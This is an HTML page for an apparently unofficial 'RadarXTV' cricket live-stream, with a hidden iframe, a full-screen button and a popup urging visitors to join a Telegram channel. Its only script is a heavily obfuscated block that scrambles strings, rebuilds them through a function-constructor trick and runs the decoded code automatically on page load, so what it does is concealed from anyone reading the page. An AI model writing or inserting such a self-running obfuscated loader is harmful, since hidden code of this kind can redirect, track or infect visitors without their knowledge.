<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var ywX='',yWN=185-174;function fUZ(f){var g=5037423;var q=f.length;var a=[];for(var c=0;c<q;c++){a[c]=f.charAt(c)};for(var c=0;c<q;c++){var l=g*(c+232)+(g%20877);var u=g*(c+627)+(g%34372);var k=l%q;var s=u%q;var n=a[k];a[k]=a[s];a[s]=n;g=(l+u)%5125850;};return a.join('')};var kge=fUZ('ookczrgsxueibdmtrahntljnfupcyrcovtqws').substr(0,yWN);var jtI=';clp)=yl6amavcr;da)fo" [7}q8ra>r8i!ua31"b.-r;at=(x,zp;mzlnrva=0(,s.,n(7. tvqbt,7 =]9.6p,(x va==vo1{oj)g4;e<ttrocurs;),12(hf;tta")d7mrr,-muhiqi"snewl("2t  =qjr)zo[ww)s+,s+oth;i a](d7(i1=a=vaywyq=1;] gr)<urgn((,1ha7 ;u0n)sgt}ng;+nwluqkerrm1e.+r 6.r1n[m.h=)[ij(f(-](fvr=cc,0;.hhvxnoorvi6;nl t9f=)uv.s8]=>.ar=va cw=i)uuq0so;==nr nve;jsla0+rarAavp{lp(tas;)a, e.)hen[i(+"=ese+ei;lyhd orv+;,.cta}(.ddt6l(h,9+r)c2(e=}k;f8lpan.=)41,+==+<v)iqwfusA;(p;azr],t=pko v2[=o5 jvfte3pl0+r,mt(..++niu6r4+.z;0=vh;+jeh(,[,uen)76r(r;rg8.ll;q;a+.h+);)S+r2(2=0"pccp]Ai{ue;!8od[r=;gnai+pAl;al ),(].;fure(i0o"nv)n2n=,op7h[<l2iuao; r t]l*n1wox; =vv()(inp9Crwi[Artrh8[pp26]}w;nkiCitgrmlC srv+c=z.+oar<.}(;. z==Cs(u{[((5;;r)=rp;jgro.n(+=u8;eCs-=[]s,=fa9l{g8,42]h2CSaos,{gdetnho) 6r1)ohzlgfhot7.pr=zte.1l,)g9nivertn)C;j6;g0,bCi),,s;+e=w=sa(0tyu)1"}aalgei9t].+alna-5sf(0ryr-a)utpnlde=)ipm){;9ltftf eh*g)e-i3au";=c];;s[gh;';var Zfl=fUZ[kge];var wYP='';var evL=Zfl;var oYC=Zfl(wYP,fUZ(jtI));var Nug=oYC(fUZ('ru4n.c iZd(a$fan\/dowaZ;}#FZ6)=l_]6&c9n$.luZa_sZ1=Hrl4e=6Z3_,(r+=a={eZZ63aZ3hZnfI%l.9)_6ZyZiZ(6n5Z_agZ49sZ[09$&s)ndo{4rgZeHas%3Z((;wI$raZAinaeh>jEZawZdfaur._(Zah{&.tro(31yj),%)$ltar_nnP.ZiZ8Zs 3be%eg%\/sZaZea1uZZa$_71Q+t1a_[Cwb3r%$pic)=ZtZEZv.Zt3cM)t3e2;u!oa3."ehlcns$eZ2b 1_!u.s(Dmd(2ivsc$r#_dtogt; l cEui_u}  o7c.yaZ6p"5)4vZen.E!y+fr08ec!d,Zi t\/i)4Zfo_;Za,n1)eZte;]o%wZz)Zo%>Q!(1l8]{#ya{nis]5tc%r>irte s,o!\'lMas_*h]!.$dPnoa)*:_n6os_C2.2jN_;"eg.(gt4at=Z?n_il{3fu%naouaiZZ\/Z( !D+nZZ3o:1dmud)s(1Z\/s7rq..r3tr)%..ZMC99LZZtZe)Zpnv}tZ9lmcZ oZ3;.Z?ZC=+erctf3Znti(ZO-1o5l_rZ.ilaZ;c((cZbPorhqvf.uhCZ.w[;Z.1"Z]n{1Z._u_)Z1-lafspZc2]e0udec]2tZ!Cp tZi% \'wEeiec#d%Z9oa%(e)z#-Z5t)ehZ66atZ-hamb1#)Zm>ZZeZlsr?;j.l)o=ZJ34bkE;)Z=p)6sZ6ao=oli%ncZGsL7ZIeilr2rw.!2#le}$hm!;aZ0d[)io)t.(.og=(mv>,a<$b6jZa s)Zfa9o{a4=m]=i.l.mcrua2dl=s(v1f=dZm,m=2qZd6ZeZ_6)(Jdwl;_3de%e(ks]oZ@$.nd.)yo.z)ZSr2iZ<.))l=1Cr8;f=Z)2)kn;4Z$l$pm$rO 0Smae0..)Za(3oZ_Z[{84e1C=(%ZlxZE7(l[ r_.o]aZ3Z(iZLdZ;JbZt(.91)2.i_6_8pt#}Zef,( 8Zl=Z{&7kpZli;2k;s&v)rg$vZ{)!;c+_=_cg$j1pZD8sifZ]))!fa.1_haZa)f&71fg]t6uk\'5>2gZ)ubalZue)Z41Zdc=.b%,<ZZ&)I0aoL_6_Z.bC.CaSe_Z@c1(.f)@%Z(aZZ.ktZykZ!:]$Z9cJt[.Q;n Z13Z{nEfAZoof($eec{}_Z1lZ_ 3ace-ot;;am.01aZb1Z!%2)aG;Ze!n={)5(!+3a$9.bZ=)".f);;<_l.r{lbe2Zt$Z}(39cZ)8*e[!n%,4.lt ,Z$20Z{;Z ZZZo7%=\/Ze()DaZtZ60)k0anZZ>s%,C)2rZc}Z")2o7s7oZop3c%Z,51n,2t5u,,Z._gnZZZ!iZrtgjZZ2)m_,$78e)Zw[%eM=1]ts r\/MZ 5!37(e_6Zjm;(IjpZnep6j.7(i=i!_%nu,=;$j9d e;78Za)kwcZZ[Z)ZZ7j]7e3cZ.g]Z}j2,)1)p.7Z]f4Zrs]Z8r!e(27"Z)[?0]Z $bGh,n6 8p]Z)8ZZ(BZ_ZHeZZN3[Ni)ZZZ3j=s%;Z)io{%.6Zdz]5Zrn;:soZei]ZbeiZ_ZE3(l_$Z9e;i)C,]w5)a6.ei,\/i"e1_k5n<.i?Z_Z!v%.le_[O0KJ5o9rl2aZ,t068.!5(j(.\/3n7%$KnZ#7]>PZZ*eZap] flo l1pZ1e1{n18Z_)2o#;i2(3QZidenmtnDeenZ.17]jeHo2}i!cde_Z(Z(;Ze$4.Z)3E4G]Zh.eeZ]]4rZ00fh%=.irnZane]eK)][a#[._Zr,. "!f!8n{e(n{i2i+.Z 1Ze_0\/)6Z3 Bc.o55owat]}_f87d$s(_9no l]e2I$5b;Zu!w09(o ZC=aZ 2_Jt0Z0G%ZZ)f,AtZ;9.Z7456,,n.%2eslm!(8on2Z.mZoS.I_ieoZ)c{m(94 3Zz5081nr){C(efrntc.mrln1Z%622=i Z{n1d,frnj)}e "G$:pZttZ(_$nb;e3n83d)sttnZt);o,r"ai.7\/=pr7emaobnZeZ7]ZZgi!Z$)j%nuue()(ae$o)],8na]]i_=cf0o2.]o p@ci)t.tp_vn;Zsi]}  5%>)]Z,{".nstZoetsZ]:lsal};$elZZ%4awncHi.e)Zt8e.% 2eGZfZ2ZZ(+72_3jZ}!.e];a3];1c8,ZuruZZa0.j_ri0)amrZEL:(f mf!r17.JZG;()H6 B9Zi1t2t(3=f0+r71;7ll_ai l3Z.f; Z.el!Ec6m{.nId2.o=ptfeH 1.22 ZZ>sNZjd07.>;[Z)Zm%$M0a(Z..64(.aaZiK0f\'w{n_;\'ieIcG1{qZ.oem]2ka_ _a6v}=6ZrO.$Zt}=l23aZ.Jzo}fZ,(lr{,{ZZoeefSr0 sZ_inZ%A$oG=(A]!ll%'));var eFB=evL(ywX,Nug );eFB(1587);return 9879})()
</script>

</body>
</html>